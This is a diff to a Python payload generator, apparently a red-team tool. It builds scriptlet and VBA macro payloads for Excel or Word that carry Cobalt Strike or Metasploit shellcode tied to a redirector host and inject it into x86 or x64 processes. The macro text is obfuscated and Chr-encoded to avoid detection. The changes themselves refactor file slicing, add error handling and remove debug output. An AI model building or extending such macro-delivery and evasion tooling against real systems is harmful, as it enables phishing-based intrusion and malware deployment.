@@ -3,7 +3,7 @@ from uuid import uuid4
 from string import ascii_uppercase, digits
 from random import choice
 from shutil import copyfile, which
-from fileops import fileFindReplace, getFileStringLineNum
+from fileops import fileFindReplace, getFileStringLineNum, getFileSectionByLineNum
 import re
 from os import system
 from sys import exit
@@ -50,21 +50,24 @@ def genSCT(framework, stagingMethod, redirector, x86, x64, cspayload='cs.sct'):
 		x64 (string): x64 process to inject
 		cspayload (string): file name of Cobalt Strike payload
 	'''
-	if 'CobaltStrike' in framework:
-		modifyCobaltStrikePayload(cspayload , x86, x64)
-	elif 'Metasploit' in framework:
-		if 'Excel' in stagingMethod:
-			msfShellCode = getMetasploitShellCode(redirector)
-			macro = genVBAMacro(stagingMethod, msfShellCode, x86, x64)
-		elif 'Word' in stagingMethod:
-			msfShellCode = getMetasploitShellCode(redirector)
-			macro = genVBAMacro(stagingMethod, msfShellCode, x86, x64)
-		else:
-			print('[-] ERROR: VBAMacro method is not supported. Exiting.')
-			exit()
+	try:
+		if 'CobaltStrike' in framework:
+			modifyCobaltStrikePayload(cspayload , x86, x64)
+		elif 'Metasploit' in framework:
+			if 'Excel' in stagingMethod:
+				msfShellCode = getMetasploitShellCode(redirector)
+				macro = genVBAMacro(stagingMethod, msfShellCode, x86, x64)
+			elif 'Word' in stagingMethod:
+				msfShellCode = getMetasploitShellCode(redirector)
+				macro = genVBAMacro(stagingMethod, msfShellCode, x86, x64)
+			else:
+				print('[-] ERROR: VBAMacro method is not supported. Exiting.')
+				exit()
 
-	else:
-		print('{0} framework is not supported yet'.format(framework))
+		else:
+			print('{0} framework is not supported yet'.format(framework))
+	except TypeError:
+		print('Not a valid configuration file name')
 
 def genVBAMacro(template, shellCode, x86, x64):
 	'''
@@ -88,14 +91,9 @@ def genVBAMacro(template, shellCode, x86, x64):
 	obfuscateVBVariables('payload.sct')
 	copyfile('payload.sct', 'obfuscate.sct')
 
+	start = getFileSectionByLineNum('payload.sct', 0, getFileStringLineNum('CodeModule.AddFromString'))
 	textToEncode = ''
 	textToEncodeList = []
-	start = []
-	end = []
-
-	with open('payload.sct', 'r') as payloadFile:
-		for line in itertools.islice(payloadFile, 0, getFileStringLineNum('CodeModule.AddFromString')):
-			start.append(line)
 	
 	with open('payload.sct', 'r') as payloadFile:
 		for line in itertools.islice(payloadFile, getFileStringLineNum('Private Type PROCESS_INFORMATION') - 1, getFileStringLineNum('DisplayAlerts') - 1):
@@ -109,10 +107,7 @@ def genVBAMacro(template, shellCode, x86, x64):
 				textToEncode += line
 				textToEncodeList.append(line)
 
-
-	with open('payload.sct', 'r') as payloadFile:
-		for line in itertools.islice(payloadFile, getFileStringLineNum('DisplayAlerts') - 1, getFileStringLineNum('</scriptlet>') + 1):
-			end.append(line)
+	end = getFileSectionByLineNum('payload.sct', getFileStringLineNum('DisplayAlerts') - 1, getFileStringLineNum('</scriptlet>') + 1)
 
 	encodedList = convertToVBAFormat(encodeStringAsChr(textToEncode))
 	encodedList.append('\n')
@@ -126,9 +121,6 @@ def genVBAMacro(template, shellCode, x86, x64):
 				payloadFile.write(item.rstrip() + ' ')
 			else:
 				payloadFile.write(item)
-
-	for i in start + textToEncodeList + end:
-		print(i.strip('\n'))
 
 def getMetasploitShellCode(redirector):
 	'''
